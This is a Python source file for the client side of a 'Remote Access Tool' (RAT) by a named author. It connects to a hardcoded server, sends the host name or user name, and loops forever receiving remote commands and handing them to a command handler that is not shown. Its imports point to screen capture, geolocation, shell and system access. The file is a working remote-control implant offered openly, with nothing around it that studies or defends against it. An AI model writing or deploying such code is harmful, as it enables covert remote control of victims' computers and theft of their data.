"""
client.py
version = 0.001
Remote Access Tool
Made by Lukas Alstrup
github.com/LukasAlstrup/rat

"""

debug = True
#TODO configure debug mode

import os
import socket
import pyautogui
import time
import getpass
import requests
import subprocess
import geocoder
import ctypes
import sys
from functions import *
import signal
import struct

class Client(object):

    def __init__(self):
        # self.serverHost = '192.168.1.9'
        self.serverHost = '192.168.0.14'
        self.serverPort = 8080
        self.socket = None

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        sys.exit(0)
        return

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    def receive_commands(self):
        #Receive command
        while True:
            command = self.socket.recv(1024)
            command = command.decode()
            check_command(socket,command)
        self.socket.close()
        return


def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)     
        else:
            break    
    #try:
    client.receive_commands()
    #except Exception as e:
    #    print('Error in main: ' + str(e))
    client.socket.close()
    return


if __name__ == '__main__':
    while True:
        main()








































































"""
#Server
port = 8080
host = "192.168.0.14"

s = socket.socket()
print("[+] Server: ", host, " Port: ", port)

#Connect to the server
while True:
    try:
        s.connect((host, port))
        break
    except ConnectionRefusedError:
        print("[-] The server refused to conect. A fireall may be blocking the port")
    except TimeoutError:
        print("[-] No response from the server")
    except Exception as e:
        print("[-] Error while connecting to the server: ", e)


print("Connected to the server successfully")

s.send(getpass.getuser().encode())


while True:
    command = s.recv(1024)
    command = command.decode()
    check_command(s,command)
"""




